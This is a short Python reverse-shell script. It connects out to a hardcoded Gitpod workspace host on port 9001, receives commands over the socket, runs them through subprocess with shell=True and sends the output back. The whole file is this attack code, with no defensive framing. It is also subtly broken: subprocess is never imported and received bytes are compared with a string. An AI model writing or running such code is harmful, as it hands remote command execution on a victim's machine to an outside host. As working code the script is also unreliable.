import socket

# Set the IP and port of the target host
IP = "9001-simonerinaldi-rinaldi-9p7xyyfmrvf.ws-eu96b.gitpod.io"
PORT = 9001

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target host
s.connect((IP, PORT))

# Create a shell by sending commands to the target host
while True:
    command = s.recv(1024)
    if command == "exit":
        s.close()
        break
    else:
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        s.send(output.stdout)
